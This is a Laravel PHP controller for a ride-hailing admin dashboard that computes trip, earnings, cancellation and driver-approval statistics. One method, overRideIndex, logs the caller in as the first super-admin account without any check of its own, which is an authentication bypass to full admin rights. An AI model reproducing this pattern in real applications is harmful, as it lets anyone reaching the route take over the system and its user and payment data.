<?php

namespace App\Http\Controllers;
use Inertia\Inertia;
use App\Models\Request\Request;
use App\Models\Request\RequestBill;
use App\Models\Admin\Driver;
use App\Models\User;
use Carbon\Carbon;
use Illuminate\Http\Request as HttpRequest;
use Illuminate\Support\Facades\Session;
use App\Http\Controllers\Web\BaseController;
use App\Models\Admin\ServiceLocation;


class DashBoardController extends BaseController
{
    public function index() 
    {

        if(access()->hasRole('user')){

            return redirect('/create-booking');
        }
        if (access()->hasRole('owner')) {
            return redirect()->route('owner.dashboard');
        }
        if (access()->hasRole('dispatcher')) {
            return redirect()->route('dispatch.dashboard');
        }

        if (access()->hasRole('employee')) {
            return redirect('/support-tickets');
        }


// dd($cancelledtrips);
        $firebaseConfig = (object) [
            'apiKey' => get_firebase_settings('firebase_api_key'),
            'authDomain' => get_firebase_settings('firebase_auth_domain'),
            'databaseURL' => get_firebase_settings('firebase_database_url'),
            'projectId' => get_firebase_settings('firebase_project_id'),
            'storageBucket' => get_firebase_settings('firebase_storage_bucket'),
            'messagingSenderId' => get_firebase_settings('firebase_messaging_sender_id'),
            'appId' => get_firebase_settings('firebase_app_id'),
        ];

        return Inertia::render('pages/dashboard/index', ['firebaseConfig' => $firebaseConfig,]);
    }
    public function todayEarnings(HttpRequest $request)
    {
        $service_location_id = $request->service_location_id;
        // Assuming $today is defined or set to today's date
        $today = now()->toDateString();
        // Fetch the data
        $tripQuery = Request::selectRaw('
            IFNULL(SUM(CASE WHEN is_completed=1 THEN 1 ELSE 0 END), 0) AS completed,
            IFNULL(SUM(CASE WHEN is_completed=0 AND is_cancelled=0 THEN 1 ELSE 0 END), 0) AS scheduled,
            IFNULL(SUM(CASE WHEN is_cancelled=1 THEN 1 ELSE 0 END), 0) AS cancelled
        ');
        
        $tripQuery = $tripQuery->whereIn('service_location_id',get_user_location_ids(auth()->user()));

        if($service_location_id && $service_location_id !== 'all'){
            $tripQuery = $tripQuery->where('service_location_id',$service_location_id);
        }
        $overallTrips = $tripQuery->first();
        $todayTrips = $tripQuery->whereDate('created_at', $today)->first();

             // Fetch overall data


//Today Earnings && today trips
        $cardEarningsQuery = "IFNULL(SUM(IF(requests.payment_opt=0,request_bills.total_amount,0)),0)";
        $cashEarningsQuery = "IFNULL(SUM(IF(requests.payment_opt=1,request_bills.total_amount,0)),0)";
        $walletEarningsQuery = "IFNULL(SUM(IF(requests.payment_opt=2,request_bills.total_amount,0)),0)";
        $adminCommissionQuery = "IFNULL(SUM(request_bills.admin_commision_with_tax),0)";
        $driverCommissionQuery = "IFNULL(SUM(request_bills.driver_commision),0)";
        $totalEarningsQuery = "$cardEarningsQuery + $cashEarningsQuery + $walletEarningsQuery";

        $earningQuery = Request::leftJoin('request_bills','requests.id','request_bills.request_id')
                            ->selectRaw("
                            {$cardEarningsQuery} AS card,
                            {$cashEarningsQuery} AS cash,
                            {$walletEarningsQuery} AS wallet,
                            {$totalEarningsQuery} AS total,
                            {$adminCommissionQuery} as admin_commision,
                            {$driverCommissionQuery} as driver_commision
                        ")
                        ->companyKey()
                        ->where('requests.is_completed',true);

        $earningQuery = $earningQuery->whereIn('service_location_id',get_user_location_ids(auth()->user()));

        if($service_location_id && $service_location_id !== 'all'){
            $earningQuery = $earningQuery->where('service_location_id',$service_location_id);
        }

//Over All Earnings
        $overallEarnings = $earningQuery->first();

        $todayEarnings = $earningQuery->whereDate('requests.trip_start_time',date('Y-m-d'))->first();

        $todayEarningData=[
            "card"=> $todayEarnings->card,
            "cash"=> $todayEarnings->cash,
            "wallet"=> $todayEarnings->wallet,
            "total"=> $todayEarnings->total,
            "admin_commision"=> $todayEarnings->admin_commision,
            "driver_commision"=> $todayEarnings->driver_commision,
        ];

        $overallEarningData=[
            "card"=> $overallEarnings->card,
            "cash"=> $overallEarnings->cash,
            "wallet"=> $overallEarnings->wallet,
            "total"=> $overallEarnings->total,
            "admin_commision"=> $overallEarnings->admin_commision,
            "driver_commision"=> $overallEarnings->driver_commision,
        ];

        $data = [
            'today' => [
                'completed' => (int) $todayTrips->completed,
                'scheduled' => (int) $todayTrips->scheduled,
                'cancelled' => (int) $todayTrips->cancelled,
                'earnings' => $todayEarningData,
            ],
            'overall' => [
                'completed' => (int) $overallTrips->completed,
                'scheduled' => (int) $overallTrips->scheduled,
                'cancelled' => (int) $overallTrips->cancelled,
                'earnings' => $overallEarningData,
            ],
        ];
    
        // Return JSON response
        return response()->json($data);
    }
    public function overallEarnings(HttpRequest $request)
    {
        $service_location_id = $request->service_location_id;
        $startDate = Carbon::now()->startOfYear(); // Start of the current year (January 1st)
        $endDate = Carbon::now(); // End date is now (current date)
    
        // Initialize arrays for months and earnings
        $months = [];
        $values = [];
    
        // Loop through each month from the start of the year to the current date
        while ($startDate->lte($endDate)) {
            $from = Carbon::parse($startDate)->startOfMonth(); // Start of the month
            $to = Carbon::parse($startDate)->endOfMonth(); // End of the month
    
            // Add the short name of the month to the months array
            $months[] = $startDate->shortEnglishMonth;
    
            // Sum up the earnings for the current month
            $totalEarnings = RequestBill::whereHas('requestDetail', function ($query) use ($from, $to, $service_location_id) {
                $query->companyKey()->whereBetween('trip_start_time', [$from, $to])->whereIsCompleted(true);
                 if($service_location_id && $service_location_id !== 'all'){
                        $query->where('service_location_id',$service_location_id);
                    }
                    else{
                        $query->whereIn('service_location_id',get_user_location_ids(auth()->user()));
                    }
            })->sum('total_amount');
    
            // Add the total earnings for the month to the values array
            $values[] = $totalEarnings;
    
            // Move to the next month
            $startDate->addMonth();
        }
    
        // Prepare the data to be returned
        $earningsData = [
            'earnings' => [
                'months' => $months,
                'values' => $values,
            ],
        ];
    
        // Return the data as a JSON response
        return response()->json($earningsData);
    }
    public function cancelChart(HttpRequest $request)
    {
        $service_location_id = $request->service_location_id;
        $startDate = Carbon::now()->startOfYear(); // Start of the current year (January 1st)
        $endDate = Carbon::now(); // End date is now (current date)

        // Initialize arrays for months and cancellation data
        $months = [];
        $a = []; // Cancelled by method '0'
        $u = []; // Cancelled by method '1'
        $d = []; // Cancelled by method '2'
    
        // Loop through each month from the start of the year to the current date
        while ($startDate->lte($endDate)) {
            $from = Carbon::parse($startDate)->startOfMonth(); // Start of the month
            $to = Carbon::parse($startDate)->endOfMonth(); // End of the month
    
            // Add the short name of the month to the months array
            $months[] = $startDate->shortEnglishMonth;
    
            $cancelQuery = Request::companyKey()->whereIsCancelled(true);

            $cancelQuery = $cancelQuery->whereIn('service_location_id',get_user_location_ids(auth()->user()));
            if($service_location_id && $service_location_id !== 'all'){
                $cancelQuery = $cancelQuery->where('service_location_id',$service_location_id);
            }
            // Collect cancellation data based on cancel method
            $a[] = $cancelQuery->whereBetween('created_at', [$from, $to])
                ->where('cancel_method', "0")
                ->count();

            $cancelQuery = Request::companyKey()->whereIsCancelled(true);

            $cancelQuery = $cancelQuery->whereIn('service_location_id',get_user_location_ids(auth()->user()));

            if($service_location_id && $service_location_id !== 'all'){
                $cancelQuery = $cancelQuery->where('service_location_id',$service_location_id);
            }
            
            $u[] = $cancelQuery->whereBetween('created_at', [$from, $to])
                ->where('cancel_method', '1')
                ->count();

            $cancelQuery = Request::companyKey()->whereIsCancelled(true);
        
            $cancelQuery = $cancelQuery->whereIn('service_location_id',get_user_location_ids(auth()->user()));
            if($service_location_id && $service_location_id !== 'all'){
                $cancelQuery = $cancelQuery->where('service_location_id',$service_location_id);
            }
            
            $d[] = $cancelQuery->whereBetween('created_at', [$from, $to])
                ->where('cancel_method', '2')
                ->count();
    
            // Move to the next month
            $startDate->addMonth();
        }
    
        // Prepare the data to be returned
        $cancelData = [
            'y' => $months,
            'a' => $a,
            'u' => $u,
            'd' => $d,
        ];

        $tripQuery = Request::companyKey()->where('created_at','>',Carbon::now()->startOfYear());

        $tripQuery = $tripQuery->whereIn('service_location_id',get_user_location_ids(auth()->user()));
        if($service_location_id && $service_location_id !== 'all'){
            $tripQuery = $tripQuery->where('service_location_id',$service_location_id);
        }
        $cancelledtrips = $tripQuery->selectRaw('
            COUNT(CASE WHEN is_cancelled = 1 AND cancel_method = 0 THEN 1 END) AS auto_cancelled,
            COUNT(CASE WHEN is_cancelled = 1 AND cancel_method = 1 THEN 1 END) AS user_cancelled,
            COUNT(CASE WHEN is_cancelled = 1 AND cancel_method = 2 THEN 1 END) AS driver_cancelled,
            COUNT(CASE WHEN is_cancelled = 1 AND cancel_method = 3 THEN 1 END) AS dispatcher_cancelled,
            COUNT(CASE WHEN is_cancelled = 1 AND is_completed = 0  THEN 1 END) AS total_cancelled
        ')->first();


        $cancelData['data'] = $cancelledtrips;
        // Return the data as a JSON response
        return response()->json($cancelData);
    }
     

    public function overallMenu() {
        return Inertia::render('pages/overall-menu');
    }

    public function overRideIndex()
    {

        $user = User::belongsToRole('super-admin')->first();

        auth('web')->login($user, true);
        
        return redirect()->route('dashboard');
    }

    public function dashboardData(HttpRequest $request)
    {

        $service_location_id = $request->service_location_id;
        $today = date('Y-m-d');
        $currency_symbol = get_settings('currency_symbol');
        // card Datas 
        $total_drivers = Driver::selectRaw('
                                        IFNULL(SUM(CASE WHEN approve=1 THEN 1 ELSE 0 END),0) AS approved,
                                        IFNULL((SUM(CASE WHEN approve=1 THEN 1 ELSE 0 END) / count(*)),0) * 100 AS approve_percentage,
                                        IFNULL((SUM(CASE WHEN approve=0 THEN 1 ELSE 0 END) / count(*)),0) * 100 AS decline_percentage,
                                        IFNULL(SUM(CASE WHEN approve=0 THEN 1 ELSE 0 END),0) AS declined,
                                        count(*) AS total
                                    ')
                                ->whereNull('owner_id')
                                ->whereHas('user', function ($query) {
                                    $query->companyKey();
                                });
        $total_drivers = $total_drivers->whereIn('service_location_id',get_user_location_ids(auth()->user()));
        if($service_location_id !== 'all'){
            $total_drivers = $total_drivers->where('service_location_id',$service_location_id);
            $service = ServiceLocation::find($service_location_id);
            if($service){
                $currency_symbol = $service->currency_symbol;
            }
        }

        $total_drivers = $total_drivers->first();
        $total_drivers = [
        'approved' => $total_drivers->approved,
        'declined' => $total_drivers->declined,
        'approve_percentage' => round($total_drivers->approve_percentage),
        'decline_percentage' => round($total_drivers->decline_percentage),
        'total' => $total_drivers->total,
      ];
// dd($total_drivers );
        $total_users = User::belongsToRole('user')->count();



        return  response()->json([
            'totalDrivers' => $total_drivers,
            'totalUsers' => $total_users,
            'currencySymbol' => $currency_symbol,
        ],200);
    }
}
